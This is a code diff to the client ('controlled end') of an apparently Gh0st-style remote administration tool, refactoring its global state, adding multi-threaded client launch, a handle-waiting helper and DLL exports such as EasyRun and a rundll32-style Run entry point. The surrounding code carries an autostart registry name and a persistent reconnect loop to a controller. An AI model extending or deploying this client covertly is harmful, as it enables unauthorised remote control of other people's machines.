@@ -18,15 +18,28 @@
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
 
+// 启动的客户端个数
+#define CLIENT_PARALLEL_NUM 1
+
+// 客户端类：将全局变量打包到一起.
+// 最终客户端只有2个全局变量: g_SETTINGS、g_MyApp，而g_SETTINGS作为g_MyApp的成员.
+// 因此全局来看只有一个全局变量: g_MyApp
+typedef struct ClientApp
+{
+	BOOL			g_bExit;			// 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
+	BOOL			g_bThreadExit;		// 工作线程状态
+	HINSTANCE		g_hInstance;		// 进程句柄
+	CONNECT_ADDRESS *g_Connection;		// 连接信息
+	HANDLE			g_hEvent;			// 全局事件
+}ClientApp;
+
 // 远程地址
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", 6543, CLIENT_TYPE_ONE};
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL};
 
-// 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
-BOOL g_bExit = 0;
-// 工作线程状态
-BOOL g_bThreadExit = 0;
+// 应用程序
+ClientApp g_MyApp = { FALSE, FALSE, NULL, &g_SETTINGS, NULL };
 
-HINSTANCE  g_hInstance = NULL;        
+// 启动核心线程，参数为：ClientApp
 DWORD WINAPI StartClient(LPVOID lParam);
 
 #if _CONSOLE
@@ -97,11 +110,123 @@ BOOL CALLBACK callback(DWORD CtrlType)
 {
 	if (CtrlType == CTRL_CLOSE_EVENT)
 	{
-		g_bExit = true;
+		g_MyApp.g_bExit = true;
 		while (E_RUN == status)
 			Sleep(20);
 	}
 	return TRUE;
+}
+
+// 线程`StartClientApp`的启动参数.
+typedef struct ClientStartArg 
+{
+	int				ID;			// 线程返回代码
+	ClientApp		App;		// 客户端对象
+	const char*		IP;			// 远程IP
+	int				Port;		// 远程端口
+}ClientStartArg;
+
+
+DWORD StartClientApp(int id, ClientApp &app, const char *ip, int port) {
+	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	BOOL& bExit(app.g_bExit);
+	if (ip != NULL && port > 0)
+	{
+		settings.SetServer(ip, port);
+	}
+	if (strlen(settings.ServerIP()) == 0 || settings.ServerPort() <= 0) {
+		Mprintf("参数不足: 请提供远程主机IP和端口!\n");
+		Sleep(3000);
+		return -1;
+	}
+	app.g_hInstance = GetModuleHandle(NULL);
+	Mprintf("[server: %d] %s:%d HINSTANCE: %p\n", id, settings.ServerIP(), settings.ServerPort(), app.g_hInstance);
+
+	do {
+		bExit = 0;
+		HANDLE hThread = CreateThread(NULL, 0, StartClient, &app, 0, NULL);
+
+		WaitForSingleObject(hThread, INFINITE);
+		CloseHandle(hThread);
+	} while (E_RUN == status && 1 != bExit);
+
+	return id;
+}
+
+
+DWORD WINAPI StartClientApp(LPVOID param) {
+	ClientStartArg* a = (ClientStartArg*)param;
+	auto r = StartClientApp(a->ID, a->App, a->IP, a->Port);
+	SAFE_DELETE(a);
+	return r;
+}
+
+
+/**
+ * @brief 等待多个句柄（支持超过MAXIMUM_WAIT_OBJECTS限制）
+ * @param handles 句柄数组
+ * @param waitAll 是否等待所有句柄完成（TRUE=全部, FALSE=任意一个）
+ * @param timeout 超时时间（毫秒，INFINITE表示无限等待）
+ * @return 等待结果（WAIT_OBJECT_0成功, WAIT_FAILED失败）
+ */
+DWORD WaitForMultipleHandlesEx(
+	const std::vector<HANDLE>& handles,
+	BOOL waitAll = TRUE,
+	DWORD timeout = INFINITE
+) {
+	const DWORD MAX_WAIT = MAXIMUM_WAIT_OBJECTS; // 系统限制（64）
+	DWORD totalHandles = static_cast<DWORD>(handles.size());
+
+	// 1. 检查句柄有效性
+	for (HANDLE h : handles) {
+		if (h == NULL || h == INVALID_HANDLE_VALUE) {
+			SetLastError(ERROR_INVALID_HANDLE);
+			return WAIT_FAILED;
+		}
+	}
+
+	// 2. 如果句柄数≤64，直接调用原生API
+	if (totalHandles <= MAX_WAIT) {
+		return WaitForMultipleObjects(totalHandles, handles.data(), waitAll, timeout);
+	}
+
+	// 3. 分批等待逻辑
+	if (waitAll) {
+		// 必须等待所有句柄完成
+		for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
+			DWORD batchSize = min(MAX_WAIT, totalHandles - i);
+			DWORD result = WaitForMultipleObjects(
+				batchSize,
+				&handles[i],
+				TRUE,  // 必须等待当前批次全部完成
+				timeout
+			);
+			if (result == WAIT_FAILED) {
+				return WAIT_FAILED;
+			}
+		}
+		return WAIT_OBJECT_0;
+	}
+	else {
+		// 只需等待任意一个句柄完成
+		while (true) {
+			for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
+				DWORD batchSize = min(MAX_WAIT, totalHandles - i);
+				DWORD result = WaitForMultipleObjects(
+					batchSize,
+					&handles[i],
+					FALSE,  // 当前批次任意一个完成即可
+					timeout
+				);
+				if (result != WAIT_FAILED && result != WAIT_TIMEOUT) {
+					return result + i; // 返回全局索引
+				}
+			}
+			if (timeout != INFINITE) {
+				return WAIT_TIMEOUT;
+			}
+		}
+	}
 }
 
 int main(int argc, const char *argv[])
@@ -121,32 +246,25 @@ int main(int argc, const char *argv[])
 	}
 	
 	SetConsoleCtrlHandler(&callback, TRUE);
-	if (argc>=3)
-	{
-		g_SETTINGS.SetServer(argv[1], atoi(argv[2]));
-	}
-	if (strlen(g_SETTINGS.ServerIP())==0|| g_SETTINGS.ServerPort()<=0)	{
-		Mprintf("参数不足: 请提供远程主机IP和端口!\n");
-		Sleep(3000);
-		return -1;
-	}
-	Mprintf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
-
-	// 获取当前模块的句柄（HINSTANCE） 
-	g_hInstance = GetModuleHandle(NULL); 
-	if (g_hInstance != NULL) {
-		Mprintf("HINSTANCE: %p\n", g_hInstance);
+	const char* ip = argc > 1 ? argv[1] : NULL;
+	int port = argc > 2 ? atoi(argv[2]) : 0;
+	g_MyApp.g_Connection->SetType(CLIENT_TYPE_ONE);
+	if (CLIENT_PARALLEL_NUM == 1) {
+		// 启动单个客户端
+		StartClientApp(0, g_MyApp, ip, port);
 	} else {
-		Mprintf("Failed to get HINSTANCE!\n");
+		std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
+		for (int i = 0; i < CLIENT_PARALLEL_NUM; i++) {
+			handles[i] = CreateThread(0, 64*1024, StartClientApp, new ClientStartArg{ i, g_MyApp, ip, port }, 0, 0);
+			if (handles[i] == 0) {
+				Mprintf("线程 %d 创建失败，错误: %d\n", i, errno);
+			}
+		}
+		DWORD result = WaitForMultipleHandlesEx(handles, TRUE, INFINITE);
+		if (result == WAIT_FAILED) {
+			Mprintf("WaitForMultipleObjects 失败，错误代码: %d\n", GetLastError());
+		}
 	}
-
-	do{
-		g_bExit = 0;
-		HANDLE hThread = CreateThread(NULL,0,StartClient,NULL,0,NULL);
-
-		WaitForSingleObject(hThread, INFINITE);
-		CloseHandle(hThread);
-	}while (E_RUN == status && 1 != g_bExit);
 
 	status = E_STOP;
 
@@ -165,7 +283,7 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 	case DLL_PROCESS_ATTACH:	
 	case DLL_THREAD_ATTACH:
 		{
-			g_hInstance = (HINSTANCE)hInstance; 
+			g_MyApp.g_hInstance = (HINSTANCE)hInstance;
 
 			break;
 		}		
@@ -178,14 +296,15 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 // 启动运行一个ghost
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
-	g_bExit = FALSE;
+	ClientApp& app(g_MyApp);
+	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	app.g_bExit = FALSE;
 	if (strlen(szServerIP)>0 && uPort>0)
 	{
-		g_SETTINGS.SetServer(szServerIP, uPort);
+		settings.SetServer(szServerIP, uPort);
 	}
-	g_SETTINGS.SetType(CLIENT_TYPE_DLL);
 
-	HANDLE hThread = CreateThread(NULL,0,StartClient,NULL,0,NULL);
+	HANDLE hThread = CreateThread(NULL,0,StartClient, &app,0,NULL);
 	if (hThread == NULL) {
 		return;
 	}
@@ -198,13 +317,33 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 }
 
 // 停止运行
-extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }
+extern "C" __declspec(dllexport) void StopRun() { g_MyApp.g_bExit = true; }
 
 // 是否成功停止
-extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }
+extern "C" __declspec(dllexport) bool IsStoped() { return g_MyApp.g_bThreadExit; }
 
 // 是否退出客户端
-extern "C" __declspec(dllexport) BOOL IsExit() { return g_bExit; }
+extern "C" __declspec(dllexport) BOOL IsExit() { return g_MyApp.g_bExit; }
+
+// 简单运行此程序，无需任何参数
+extern "C" __declspec(dllexport) int EasyRun() {
+	ClientApp& app(g_MyApp);
+	CONNECT_ADDRESS& settings(*(app.g_Connection));
+
+	do {
+		TestRun((char*)settings.ServerIP(), settings.ServerPort());
+		while (!IsStoped())
+			Sleep(50);
+		if (1 == app.g_bExit) // 受控端退出
+			break;
+		else if (2 == app.g_bExit)
+			continue;
+		else // 3: 程序更新
+			break;
+	} while (true);
+
+	return app.g_bExit;
+}
 
 // copy from: SimpleRemoter\client\test.cpp
 // 启用新的DLL
@@ -264,12 +403,15 @@ int nCmdShow: 窗口显示状态。
 优先从命令行参数中读取主机地址，如果不指定主机就从全局变量读取。
 */
 extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+	ClientApp& app(g_MyApp);
+	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	BOOL& bExit(app.g_bExit);
 	char message[256] = { 0 };
 	if (strlen(lpszCmdLine) != 0) {
 		strcpy_s(message, lpszCmdLine);
-	}else if (g_SETTINGS.IsValid())
+	}else if (settings.IsValid())
 	{
-		sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+		sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
 	}
 
 	std::istringstream stream(message);
@@ -291,15 +433,15 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
 		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
 		while (!IsStoped())
 			Sleep(20);
-		if (g_bExit == 1)
+		if (bExit == 1)
 			return;
-		else if (g_bExit == 2)
+		else if (bExit == 2)
 			continue;
 		else // 3
 			break;
 	} while (true);
 
-	sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+	sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
 	RunNewDll(message);
 }
 
@@ -307,36 +449,51 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
 
 DWORD WINAPI StartClient(LPVOID lParam)
 {
-	IOCPClient  *ClientObject = new IOCPClient(g_bExit);
+	ClientApp& app(*(ClientApp*)lParam);
+	CONNECT_ADDRESS& settings(*(app.g_Connection));
+	BOOL& bExit(app.g_bExit);
+	IOCPClient  *ClientObject = new IOCPClient(bExit);
 
-	g_bThreadExit = false;
-	while (!g_bExit)
+	if (NULL == app.g_hEvent)
+		app.g_hEvent = CreateEventA(NULL, TRUE, FALSE, EVENT_FINISHED);
+	if (app.g_hEvent == NULL) {
+		Mprintf("[StartClient] Failed to create event: %s! %d.\n", EVENT_FINISHED, GetLastError());
+	}
+
+	app.g_bThreadExit = false;
+	while (!bExit)
 	{
 		ULONGLONG dwTickCount = GetTickCount64();
-		if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
+		if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort()))
 		{
-			for (int k = 500; !g_bExit && --k; Sleep(10));
+			for (int k = 500; !bExit && --k; Sleep(10));
 			continue;
 		}
 		//准备第一波数据
-		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount, g_SETTINGS.ClientType());
+		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings.ClientType());
+		ClientObject->SendLoginInfo(login);
 
-		CKernelManager	Manager(&g_SETTINGS, ClientObject, g_hInstance);
-		bool	bIsRun = 0;
+		CKernelManager	*Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance);
 		do 
 		{
+			Manager->SendHeartbeat();
+		} while (ClientObject->IsRunning() && ClientObject->IsConnected() && !bExit);
+		while (GetTickCount64() - dwTickCount < 5000 && !bExit)
 			Sleep(200);
 
-			bIsRun  = ClientObject->IsRunning();
+		delete Manager;
+	}
+	if (app.g_bExit == 1 && app.g_hEvent) {
+		BOOL b = SetEvent(app.g_hEvent);
+		Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");
 
-		} while (bIsRun && ClientObject->IsConnected() && !g_bExit);
-		while (GetTickCount64() - dwTickCount < 5000 && !g_bExit)
-			Sleep(200);
+		CloseHandle(app.g_hEvent);
+		app.g_hEvent = NULL;
 	}
 
 	Mprintf("StartClient end\n");
 	delete ClientObject;
-	g_bThreadExit = true;
+	app.g_bThreadExit = true;
 
 	return 0;
 } 
